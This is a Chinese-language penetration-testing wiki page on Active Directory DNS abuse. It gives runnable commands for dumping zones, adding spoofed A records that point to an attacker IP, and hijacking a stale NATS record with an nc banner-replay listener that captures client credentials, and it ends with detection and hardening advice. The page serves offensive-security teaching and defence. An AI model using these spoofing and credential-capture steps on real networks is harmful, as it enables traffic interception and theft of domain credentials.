# AD DNS 记录

{{#include ../../banners/hacktricks-training.md}}

默认情况下，Active Directory 中的**任何用户**都可以**枚举** Domain 或 Forest DNS zones 中的所有 DNS records，类似于 zone transfer（在 AD 环境中，用户可以列出 DNS zone 的子对象）。

工具 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) 支持**枚举**并**导出**该 zone 中的**所有 DNS records**，用于内部网络的 recon。<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0（2025 年 4 月）新增 JSON/Greppable（`--json`）输出、多线程 DNS 解析，以及绑定到 LDAPS 时对 TLS 1.2/1.3 的支持

更多信息请阅读 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## 创建 / 修改记录（ADIDNS spoofing）

由于 **Authenticated Users** 组默认在 zone DACL 上拥有 **Create Child** 权限，任何 domain account（或 computer account）都可以注册其他记录。这可用于 traffic hijacking、NTLM relay coercion，甚至完全 compromize domain。

### PowerMad / Invoke-DNSUpdate（PowerShell）
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*（dnsupdate.py 随 Impacket ≥0.12.0 一起提供）*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 常见攻击原语

1. **Wildcard record** – `*.<zone>` 会将 AD DNS server 变成类似于 LLMNR/NBNS spoofing 的企业级 responder。它可被滥用于捕获 NTLM hashes，或将其 relay 到 LDAP/SMB。（需要禁用 WINS-lookup。）<sup>[[1]](#references)</sup>
2. **WPAD hijack** – 添加 `wpad`（或添加一个指向 attacker host 的 **NS** record，以绕过 Global-Query-Block-List），并对出站 HTTP requests 进行透明 proxy，从而 harvest credentials。Microsoft 已修复 wildcard/ DNAME bypasses（CVE-2018-8320），但 **NS-records 仍然有效**。<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – 占用之前属于某台 workstation 的 IP address，而关联的 DNS entry 仍会继续解析，从而无需接触 DNS 即可启用 resource-based constrained delegation 或 Shadow-Credentials attacks。
4. **DHCP → DNS spoofing** – 在默认的 Windows DHCP+DNS deployment 中，同一 subnet 上的 unauthenticated attacker 可以通过发送伪造的 DHCP requests 触发 dynamic DNS updates，从而覆盖任何现有的 A record（包括 Domain Controllers）（Akamai “DDSpoof”，2023）。这会在 Kerberos/LDAP 上造成 machine-in-the-middle，并可能导致 full domain takeover。<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – 修改你控制的 machine account 的 `dNSHostName`，注册匹配的 A record，然后为该 name request a certificate，以 impersonate DC。**Certipy** 或 **BloodyAD** 等 tools 可以完全自动化这一流程。

---

### 通过 stale dynamic records 劫持内部 service（NATS case study）

当 dynamic updates 对所有 authenticated users 保持开放时，**已 deregister 的 service name 可以被重新 claim，并指向 attacker infrastructure**。Mirage HTB DC 在 DNS scavenging 后暴露了 hostname `nats-svc.mirage.htb`，因此任何 low-privileged user 都可以：<sup>[[3]](#references)</sup>

1. **确认 record 已缺失**，并使用 `dig` 获取 SOA：
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **向其控制的外部/VPN 接口重新创建该记录**：
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **冒充明文服务**。NATS 客户端在发送凭据前会先接收一个 `INFO { ... }` banner，因此从真实 broker 复制一个合法 banner 就足以窃取机密：
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
任何解析被劫持名称的客户端都会立即将其 JSON `CONNECT` frame（包括 `"user"`/`"pass"`）leak 给 listener。在攻击者主机上运行官方 `nats-server -V` binary、禁用其日志脱敏，或仅使用 Wireshark sniff session，都能获得相同的明文凭据，因为 TLS 是可选的。

4. **使用捕获的 creds 进行 Pivot** – 在 Mirage 中，被盗的 NATS account 提供了 JetStream access，从而暴露了包含可复用 AD usernames/passwords 的历史 authentication events。

此模式适用于所有依赖不安全 TCP handshakes 的 AD-integrated service（HTTP APIs、RPC、MQTT 等）：一旦 DNS record 被 hijack，攻击者就成为该 service。

---

## Detection & hardening

* 拒绝 **Authenticated Users** 在敏感 zones 上的 *Create all child objects* 权限，并将 dynamic updates 委派给 DHCP 使用的专用 account。
* 如果必须使用 dynamic updates，将 zone 设置为 **Secure-only**，并在 DHCP 中启用 **Name Protection**，这样只有 owner computer object 才能覆盖自己的 record。
* 监控 DNS Server event IDs 257/252（dynamic update）、770（zone transfer），以及对 `CN=MicrosoftDNS,DC=DomainDnsZones` 的 LDAP writes。
* 使用有意安全的 record 或 Global Query Block List，阻止危险名称（`wpad`、`isatap`、`*`）。
* 保持 DNS servers 完成 patch – 例如，RCE bugs CVE-2024-26224 和 CVE-2024-26231 达到 **CVSS 9.8**，并且可对 Domain Controllers 进行远程 exploit。

## References

- [1] [ADIDNS Revisited - WPAD, GQBL, and More](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018，至今仍是 wildcard/WPAD attacks 的事实标准 reference)
- [2] [Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (2023 年 12 月)
- [3] [HackTheBox Mirage: Chaining NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets, and Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping Active Directory DNS using adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
